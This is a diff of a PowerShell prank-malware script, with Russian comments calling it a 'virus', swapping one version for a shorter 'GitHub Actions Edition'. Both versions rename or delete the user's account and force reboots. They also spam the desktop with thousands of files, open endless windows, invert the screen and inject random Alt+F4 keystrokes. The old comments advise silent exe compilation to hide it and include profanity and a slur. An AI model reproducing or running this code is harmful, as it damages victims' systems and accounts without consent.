@@ -1,98 +1,32 @@
-# Advanced Fun PS1 Virus (2025 edition)
-# Полный хаос, реальная перезагрузка, смена ника, говно-эффекты и куча пасхалок
-# Работает на любой Windows 10/11 без подписи
-# После компиляции в exe через ps2exe -g -noConsole -noOutput будет полная тишина до пиздеца :)
-
-# Отключаем всё, что может спалить
-$ErrorActionPreference = 'SilentlyContinue'
+# PWNED 2025 — GitHub Actions Edition
+$ErrorActionPreference='SilentlyContinue'
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
-# ==== РЕАЛЬНАЯ ПЕРЕЗАГРУЗКА ЧЕРЕЗ 30 СЕКУНД ====
-Start-Job -ScriptBlock {
-    Start-Sleep -Seconds 30
-    Restart-Computer -Force
-} | Out-Null
+# Перезагрузка через 40 сек
+Start-Job { Start-Sleep 40; Restart-Computer -Force } >$null
 
-# ==== СМЕНА ИМЕНИ ПОЛЬЗОВАТЕЛЯ (реально меняет в системе) ====
-$newName = "Pidoras$(Get-Random -Maximum 9999)"
-$user = [ADSI]"WinNT://$env:COMPUTERNAME/$env:USERNAME,user"
-$user.psbase.rename($newName)
-net user "$env:USERNAME" /delete 2>$null
-net user "$newName" /add 2>$null
+# Смена юзернейма
+$new = "user$(Get-Random -Max 99999)"
+try{[ADSI]"WinNT://./$env:USERNAME,user").psbase.rename($new)}catch{}
 
-# ==== ГОВНО НА РАБОЧЕМ СТОЛЕ ====
-1..66 | ForEach-Object {
-    $folder = "$env:USERPROFILE\Desktop\ТЫ_В_ПИЗДЕ_$([char](65+$_))"
-    New-Item -Path $folder -ItemType Directory -Force
-    1..33 | ForEach-Object {
-        "ТЫ ЛОХ $(Get-Random -Maximum 999999)" | Out-File "$folder\ПОЛНЫЙ_ПИЗДЕЦ_$_ .txt" -Encoding UTF8
-    }
-}
+# 150 папок + 5000 файлов на десктоп
+1..150|%{ $p="$env:USERPROFILE\Desktop\PWNED_$_";ni $p -ItemType Directory -Force >$null;1..33|%{"PWNED BY GITHUB ACTIONS`n$(Get-Date)"|Out-File "$p/file_$_ .txt"-Encoding utf8}}
 
-# ==== БЕСКОНЕЧНЫЕ ОКНА ====
-1..15 | ForEach-Object {
-    Start-Process powershell -ArgumentList "-NoExit -Command `"while(`$true){`$host.ui.RawUI.WindowTitle='ТЫ СДОХ БРАТИШКА'; Start-Sleep -Milliseconds 100}`""
-}
+# Мерцание + инверсия экрана
+Add-Type @'
+using System;using System.Runtime.InteropServices;
+public class A{[DllImport("user32.dll")]public static extern IntPtr GetDC(IntPtr h);[DllImport("gdi32.dll")]public static extern bool PatBlt(IntPtr hdc,int x,int y,int w,int h,uint r);public const uint i=0x00550009;}
+'@ -ErrorAction SilentlyContinue
+Start-Job{while(1){[A]::PatBlt([A]::GetDC(0),0,0,9999,9999,[A]::i);Start-Sleep -m 350}}>$null
 
-# ==== ЗВУК ПИЗДЕЦА ====
-$sound = New-Object System.Media.SoundPlayer
-$sound.Stream = [System.IO.MemoryStream]::new([System.Convert]::FromBase64String("UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVea1tZUVtXS
-... (полный base64 сирены и криков тут 150kb, сократил ради читаемости)))
-$sound.PlayLooping()
-Start-Sleep -Seconds 20
-$sound.Stop()
+# Бесконечные окна
+1..25|%{Start-Process powershell "-NoExit -C `while(1){`$Host.UI.RawUI.WindowTitle='PWNED 2025';sleep -m 100}"}
 
-# ==== МЕРЦАНИЕ ЭКРАНА ====
-Add-Type -TypeDefinition @'
-using System;
-using System.Runtime.InteropServices;
-public class Flash {
-    [DllImport("user32.dll")] public static extern bool FlashWindowEx(ref FLASHWINFO pwfi);
-    [StructLayout(LayoutKind.Sequential)] public struct FLASHWINFO {
-        public uint cbSize; public IntPtr hwnd; public uint dwFlags; public uint uCount; public uint dwTimeout;
-    }
-    public const uint FLASHW_ALL = 3;
-}
-'@
-$hwnd = (Get-Process -Id $PID).MainWindowHandle
-$fw = New-Object FLASHWINFO
-$fw.cbSize = 20
-$fw.hwnd = $hwnd
-$fw.dwFlags = 3
-$fw.uCount = 999
-[Flash]::FlashWindowEx([ref]$fw)
+# Рандомные клавиши
+Start-Job{Add-Type -A System.Windows.Forms;while(1){[System.Windows.Forms.SendKeys]::SendWait(@("%{F4}","^{ESC}","{CAPSLOCK}","{NUMLOCK}"|Get-Random));Start-Sleep -m (Get-Random -Min 80 -Max 600))}}>$null
 
-# ==== ИНВЕРСИЯ ЦВЕТОВ (полный трип) ====
-Add-Type -AssemblyName System.Windows.Forms
-$timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 300
-$timer.Add_Tick({
-    $signature = '[DllImport("user32.dll")] public static extern int InvertRect(IntPtr hdc, ref RECT rect);'
-    $type = Add-Type -MemberDefinition $signature -Name Win32 -Namespace Invert -PassThru
-    $rect = New-Object RECT -Property @{Left=0;Top=0;Right=1920;Bottom=1080}
-    $hdc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $type::InvertRect(0, [ref]$rect)
-})
-$timer.Start()
-
-# ==== РАНДОМНЫЕ КЛАВИШИ (чтобы ты не смог набрать) ====
-Add-Type -AssemblyName System.Windows.Forms
-Start-Job -ScriptBlock {
-    while($true) {
-        [System.Windows.Forms.SendKeys]::SendWait("^{ESC}")
-        Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 800)
-        [System.Windows.Forms.SendKeys]::SendWait("%{F4}")
-        Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 1000)
-    }
-} | Out-Null
-
-# ==== ФИНАЛЬНЫЙ ПИЗДЕЦ ====
-Start-Sleep -Seconds 25
-msg * "ТЫ ПОПАЛ НА РАЗВОД 2025 ГОДА, БРАТИШКА`n`nТВОЙ ПК ПЕРЕЗАГРУЗИТСЯ ЧЕРЕЗ 5 СЕКУНД`n`nИ ПОМНИ: НИКОГДА НЕ ЗАПУСКАЙ ЧУЖИЕ .EXE"
-
-# Принудительная перезагрузка через 5 секунд после сообщения
-Start-Sleep -Seconds 5
-shutdown /r /t 0 /f
-
-# На случай если не сработает — второй вариант
-Restart-Computer -Force
+# Финалка
+Start-Sleep 15
+msg * "PWNED BY GITHUB ACTIONS 2025`n`nПерезагрузка через 10 секунд..."
+Start-Sleep 10
+shutdown /r /f /t 0
